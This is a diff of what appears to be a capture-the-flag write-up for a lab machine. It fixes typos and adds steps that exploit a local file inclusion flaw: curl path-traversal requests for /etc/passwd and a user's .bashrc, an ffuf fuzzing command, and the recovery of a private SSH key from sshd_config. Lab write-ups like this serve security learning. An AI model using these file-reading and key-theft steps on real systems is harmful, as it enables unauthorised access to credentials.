@@ -49,9 +49,9 @@ Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
 
 The FTP server does not have Anonymous login enabled so I can't use that to enumerate files in there.
 As I don't have any username for FTP or SSH I'm not going to bruteforce them as it's most probably just a waste of time.
-I also used "nmap -sVC --script vuln,default,safe,version -p21,22,80 10.10.28.97" to more enumerate the target.
+I also used "nmap -sVC --script vuln,default,safe,version -p21,22,80 10.10.28.97" to further enumerate the target.
 I'm not going to copy it here as it's very long but at the bottom, it reads: "|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te..."
-Lets use curl to see what was snipped out of the line.
+Let's use curl to see what was snipped out of the line.
 -----
 curl http://10.10.28.97
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
@@ -202,7 +202,7 @@ curl http://dev.team.thm
 -----
 
 The site has a link to a "script.php?page=teamshare.php". The site just has the line "Place holder for future team share".
-Script.php uses "page=" parameter to load the "teamshare.php" file and it might be vulnerable to LFI.
+Script.php uses the "page=" parameter to load the "teamshare.php" file and it might be vulnerable to LFI.
 LFI is easy to test by trying to load a file that every Linux OS has, "/etc/passwd".
 -----
 curl http://dev.team.thm/script.php?page=../../../../../../../../../etc/passwd
@@ -243,6 +243,27 @@ sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
 -----
 
 This confirms that there is a working LFI. There is dale user with ID 1000 so I will start with that.
+I also confirmed that dale user has a home folder with with curl.
+-----
+curl http://dev.team.thm/script.php?page=../../../../../../../../../home/dale/.bashrc
+
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+-----SNIP-----
+-----
+
+I then tried to curl for "/home/dale/.ssh/id_rsa" but sadly it returned nothing so the file does not exist.
+I wanted to automate querying of the files so I used ffuf to do that.
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -t 80 -u http://dev.team.thm/script.php?page=../../../../../../../../..FUZZ -fs 1
+Returns a number of files and after looking at a few of them I checked the "/etc/ssh/sshd_config" which at the bottom contained the dale user id_rsa file.
+I copied it to a file and removed all the "#"s before the key.
+
 
 
 
